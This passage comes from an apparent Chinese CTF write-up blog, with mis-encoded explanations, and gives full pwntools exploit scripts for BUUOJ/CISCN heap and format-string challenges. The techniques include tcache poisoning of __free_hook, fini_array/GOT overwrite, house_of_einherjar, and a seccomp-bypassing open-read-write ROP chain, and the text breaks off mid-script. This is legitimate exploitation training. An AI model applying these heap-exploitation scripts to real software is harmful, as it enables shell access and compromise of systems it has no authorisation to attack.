main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25412\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Input your choice:\"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"Please input the size of story: \\n\", str(size))\n    sa(\"please inpute the story: \\n\", con)\n\ndef delete(idx):\n    sla(menu, \"4\")\n\nsla(\"Please input the index:\\n\", str(idx))\nsla(\"What's your name?\\n\",\"%p.%p\")\nru(\".0x\")\nread_addr = int(rc(12),16)-0x11\nobj = LibcSearcher(\"read\", read_addr)\nlibc_base = read_addr-obj.dump('read')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nfree_hook = libc_base + obj.dump('__free_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nsla(\"Please input your ID.\\n\",\"A\")\nadd(0x18,p64(free_hook))\nadd(0x18,\"/bin/sh\\x00\")\ndelete(0)\ndelete(0)\nadd(0x18,p64(free_hook))\nadd(0x18,p64(free_hook))\nadd(0x18,p64(system_addr))\ndelete(1)\np.interactive()\n```\n\n3.ciscn_2019_s_6ï¼šæ°´åˆ°å®¶çš„é¢˜ï¼Œæ‡’å¾—çœ‹ï¼Œä¸¤åˆ†é’Ÿæ”¹å®Œè„šæœ¬æ‹‰å€’ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_6\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\np = process(binary)\n#p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"25301\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size,name,call):\n    p.recvuntil('choice:')\n    p.sendline('1')\n    p.recvuntil('name')\n    p.sendline(str(size))\n    p.recvuntil('name:')\n    p.sendline(name)\n    p.recvuntil('call:')\n    p.sendline(call)\n\ndef show(idx):\n    p.recvuntil('choice:')\n    p.sendline('2')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\ndef delete(idx):\n    p.recvuntil('choice:')\n    p.sendline('3')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\nadd(0x88,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nfor i in range(7):\n    delete(0)\n\ndelete(0)\nshow(0)\np.recvuntil('name')\nmain_arena=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-96\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nfree_hook = libc_base + obj.dump(\"__free_hook\")\nsystem_addr = libc_base + obj.dump(\"system\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\n#p.recvuntil()\ndelete(1)\ndelete(1)\ndelete(1)\n\nadd(0x20,p64(free_hook),'pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,p64(system_addr),'pppp')\nadd(0x20,'/bin/sh\\x00','pppp')\n\ndelete(6)\np.interactive()\n```\n\n4.ciscn_2019_sw_1ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ”¹fini_arrayä¸ºmain_addrï¼Œä½¿å¾—ç¨‹åºå¾ªç¯å†æ¥ä¸€æ¬¡ï¼ŒåŠ«æŒprintfä¸ºsystem_pltï¼Œå†è¾“å…¥binshå³å¯getshellã€‚ç¨‹åºé‡Œçš„sysæ²¡å•¥ç”¨ï¼Œç”¨æ¥è¿·æƒ‘äººçš„ï¼Œå› ä¸ºcommandæ— æ³•è¢«ä¿®æ”¹ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_2019_sw_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27341\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nfini_array = 0x0804979C\nprintf_got = elf.got['printf']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\n\npayload = \"\"\npayload += p32(fini_array+2)\npayload += p32(fini_array)\npayload += p32(printf_got+2)\npayload += p32(printf_got)\npayload += '%'+str(0x0804-0x10)+'c'+'%4$hn'\npayload += '%'+str(int(main_addr&0xffff)-0x0804)+'c'+'%5$hn'\npayload += '%'+str(0x10804-int(main_addr&0xffff))+'c'+'%6$hn'\npayload += '%'+str(int(system_plt&0xffff)+0x10000-0x10804)+'c'+'%7$hn'\n\n\npause()\np.sendline(payload)\npause()\np.sendline(\"/bin/sh\\x00\")\npause()\np.interactive()\n```\n\n5.ciscn_2019_s_1ï¼šå·®ç‚¹è¢«è¿™é“é¢˜æå´©æºƒã€‚ç½‘ä¸Šè§£æ³•å¤ªå¤šï¼Œæ„Ÿè§‰éƒ½æŒºéº»çƒ¦çš„ã€‚å…¶å®ç›´æ¥ä¸€ä¸ªæŠ€å·§å°±æå®šï¼šhouse_of_einherjarã€‚è¿›è¡Œä¸€å®šå †å¸ƒå±€ï¼Œç”³è¯·chunk8-chunk10ï¼Œå°†0x100çš„tcacheå¡«æ»¡ï¼Œåœ¨chunk8ä¸­ä¼ªé€ chunkï¼Œæ»¡è¶³2.27ä¸‹çš„unlinkè¦æ±‚ï¼Œå³sizeä½å’Œfd,bkä½ã€‚(ç”±äºè¿™é‡Œç»™äº†å †åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ï¼Œæ°å¥½èƒ½å¤Ÿæ»¡è¶³è¦æ±‚)ä¹‹åè§¦å‘0x100çš„off-by-nullå‘ä¸Šåˆå¹¶ï¼Œå°†chunk9ç»™overlapï¼Œä¹‹åç”³è¯·åˆ°tcacheç»“æ„ä½“ï¼Œå°±èƒ½éšä¾¿ç©äº†ã€‚(house_of_einherjaré‡ç‚¹åœ¨äº2.27ä¸‹çš„unlink)\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\np = process(binary)\n#p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"26685\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"4.show\\n\"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index:\\n\", str(idx))\n    sla(\"size:\\n\", str(size))\n    ru(\"gift: \")\n    chunk_addr = int(ru(\"\\n\"),16)\n    sa(\"content:\\n\", con)\n    return chunk_addr\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"4\")\n    sla(\"index:\\n\", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n    sa(\"content:\\n\", con)\n\nkey_addr = 0x6022B8\n\nchunk0_addr = add(0,0xf8,\"0\")\nheap_base = chunk0_addr-0x260\n\nchunk8_addr = add(8,0xf8,\"8\")\nchunk9_addr = add(9,0xe8,\"9\")\nchunk10_addr = add(10,0xf8,\"10\")\nlog.info(\"chunk8_addr:0x%x\"%chunk8_addr)\nlog.info(\"chunk9_addr:0x%x\"%chunk9_addr)\nlog.info(\"chunk10_addr:0x%x\"%chunk10_addr)\n\nedit(8,p64(0x110)+p64(0xf1+0xf0)+\np64(chunk8_addr)+p64(chunk8_addr))\nedit(9,\"9\"*0xe0+\np64(0xf0+0xf0))\n\nfor i in range(0,7):\n    add(i+1,0xf8,\"X\"*0xf7)\nfor i in range(0,7):\n    delete(i+1)\n\ndelete(9)\ndelete(10)\nchunkA_addr = add(9,0xd0,\"9\")\nchunkB_addr = add(10,0xd0,\np64(0x0)+p64(0xf0)+\np64(heap_base+0x10)+p64(heap_base+0x10))\nunsortedbin_addr = chunk8_addr+0x10+0xe0+0xe0\n\nadd(11,0xe8,p64(heap_base+0x10))\nadd(12,0xe8,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(0x0)+ #0xa0\np64(unsortedbin_addr-0x10)+ #0xb0\np64(heap_base+0x10)) #0xc0\n\nadd(13,0x88,p64(0x1))\nadd(14,0xa0,\"A\"*0x10)\nshow(14)\nru(\"AAAAAAAAAAAAAAAA\")\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\") #system\nfree_hook_addr = libc_base + obj.dump(\"__free_hook\")\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\nedit(12,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(free_hook_addr)+ #0xa0\np64(unsortedbin_addr-0x10)) #0xc0\n\nadd(15,0x98,p64(system_addr))\nadd(16,0xf0,\"/bin/sh\\x00\")\n\ndelete(16)\np.interactive()\n```\n\n \n","tags":["åˆ·é¢˜"],"categories":["PWN"]},{"title":"CISCN2021çº¿ä¸Šå¤ç°","url":"/2021/08/14/CISCN2021çº¿ä¸Šå¤ç°/","content":"\nä¸€.lonelywolfï¼šUAFï¼Œshowå‡½æ•°ä¹Ÿå¯ä»¥æ³„éœ²é‡Šæ”¾åçš„å †å—ã€‚\n\n1.æ€è·¯ï¼š\n\n(1)ç”±äºåœ¨editçš„æ—¶å€™å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°å˜é‡ï¼Œç„¶åä¾æ®sizeæ¥ä»å˜é‡ä¸­è·å–æ•°æ®æ‹·è´åˆ°chunkä¸­ï¼Œæ‰€ä»¥æœ€åè¡¥0å…¶å®æ²¡åŠæ³•é€ æˆoff by nullã€‚\n\n(2)ç”³è¯·0x8å¤§å°çš„å †å—ï¼Œé‡Šæ”¾åä¿®æ”¹æ•°æ®ï¼Œè¿ä¸Šæ”¾å…¥tcacheä¹‹åè¢«èµ‹å€¼çš„bkï¼Œshowä¸€ä¸‹ï¼Œæ³„éœ²å‡ºå †åœ°å€ã€‚\n\n(3)ç”³è¯·æœ€å¤§sizeçš„chunkï¼Œ0x78ï¼Œdeleteä¹‹åæ”¹æ‰fdæŒ‡å‘heap_baseï¼Œè·å¾—tcacheç»“æ„ä½“çš„æ§åˆ¶æƒï¼Œ0-0x40ä¸ºå¤§å°ï¼Œ0x40-0x78ä¸ºbiné“¾ï¼Œå¯æ§0x20,0x30,0x40,0x50,0x60,0x70,0x80çš„biné“¾ã€‚\n\n(4)ä¹‹åå°±éšæ„äº†ï¼Œæ§biné“¾å’Œbinå¤§å°ï¼Œå°†ä»»æ„ä¸€ä¸ªbinå¤§å°çš„countæ”¹æˆ7ï¼Œä¼ªé€ æ»¡tcacheï¼Œä¹‹åé‡Šæ”¾ä¸€ä¸ªchunkå³å¯è¿›å…¥unsortedbinä¸­ï¼Œshowä¸€ä¸‹å¾—åˆ°Libcåœ°å€ã€‚\n\n(5)å†æ§tcacheç»“æ„ä½“ï¼Œç›´æ¥å¾—åˆ°malloc_hookçš„chunkï¼Œæ”¹ä¸ºOne_gadgetï¼Œå†ç”³è¯·ä¸€ä¸‹chunkå³å¯getshellã€‚\n\n2.exp\n\n```\n#æ³¨é‡Šå¤´\n\nfrom pwn import *\n#context.log_level = 'debug'\nlocal = 0\nif local:\np = process('./lonelywolf')\nelf = ELF(\"./lonelywolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc = malloc_hook-0x3EBC30\nsystem = libc+0x4F550\nprint(\"free_hook:\",hex(free_hook))\nprint(hex(malloc_hook))\n\n#change malloc_hook to one_gadget\none_gadget = libc+0x10a41c\nedit(0,\"\\x02\"+\"\\x00\"*0x3f+p64(heap+0x280)+\"\\x00\"*0x30)\nadd(0,0x8)\ndelete(0)\nedit(0,p64(malloc_hook))\nadd(0,0x8)\nadd(0,0x8)\nedit(0,p64(one_gadget))\nadd(0,0x8)\np.interactive()\n```\n\n \n\näºŒã€silverwolfï¼š(æ¯”èµ›çš„æ—¶å€™æ²¡æ¥è§¦è¿‡seccompä¿æŠ¤ï¼Œåœ¨å­¦é•¿çš„æŒ‡å¯¼ä¸‹ä¹Ÿç®—æ˜¯åšå‡ºæ¥äº†ã€‚)å’Œä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯åŠ äº†æ²™ç®±ä¿æŠ¤ï¼Œç”¨seccomp-tools dump ./silverwolfæŸ¥çœ‹ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\nå¯ä»¥çœ‹åˆ°åªå‰©readå’Œwriteæƒé™äº†ï¼ŒåŒæ—¶é¢˜ç›®æç¤ºflagåœ¨./flagï¼Œæ‰€ä»¥ç”¨readå’Œwriteæ¥è¯»å–å’Œæ‰“å°flagå³å¯ï¼Œåˆ©ç”¨orwã€‚\n\n1.æ€è·¯ï¼š\n\n(1)ä¸€æ ·çš„ï¼Œæ§tcacheç»“æ„ä½“æ³„éœ²heapå’Œlibcã€‚\n\n(2)è¿™é‡Œç”±äºå¼€seccompä¿æŠ¤ä¼šç”³è¯·æŒºå¤šå †å—çš„ï¼Œæ‰€ä»¥binså’Œheapä¸­éƒ½æ¯”è¾ƒä¹±ï¼Œå†åŠ ä¸Šé™åˆ¶sizeï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\nâ‘ ä¸€æ˜¯æ§tcacheï¼Œä»0x10-0x80éƒ½ç»™æ§äº†ï¼ŒåŠ èµ·æ¥æ€»å…±0x240ï¼Œè¿™é‡Œç®—å‡ºæ¥æ˜¯0x148ï¼Œè¶³å¤Ÿæ”¾ä¸‹orwäº†ã€‚\n\nâ‘¡äºŒæ˜¯åˆ©ç”¨IO_FILEæ³„éœ²environï¼Œå¾—åˆ°æ ˆåœ°å€ï¼Œå†æ³„éœ²å¾—åˆ°ELFåŸºåœ°å€ï¼Œè®¡ç®—BSSæ®µï¼Œå°†sizeç»™æ”¹äº†ï¼Œé‚£ä¹ˆeditæƒ³è¾“å…¥å¤šå°‘æ•°æ®å°±èƒ½è¾“å…¥å¤šå°‘ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¸€ä¸ªchunkä¸­æ”¾ä¸‹æ‰€æœ‰orwã€‚\n\n2.è´´ä¸‹exp:\n\nâ‘ æ§tcacheï¼š\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(IO_2_1_stdout_addr)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x68)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x78)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)+ #0x60\np64(0x0)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\nadd(0,0x78)\nedit(0,\"\\x02\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+\"\\x02\" +\"\\x00\"*0x38+\np64(heap+0x2e0)+ #0x20\np64(heap+0x2e0+0x10)+ #0x30 \np64(heap+0x2e0+0x30)+ #0x40 \np64(heap+0x2e0+0x60)+ #0x50\np64(heap+0x2e0+0xa0)+ #0x60\np64(heap+0x2e0+0xf0)+ #0x70 \np64(heap+0x2e0)) #0x80\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\n\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += 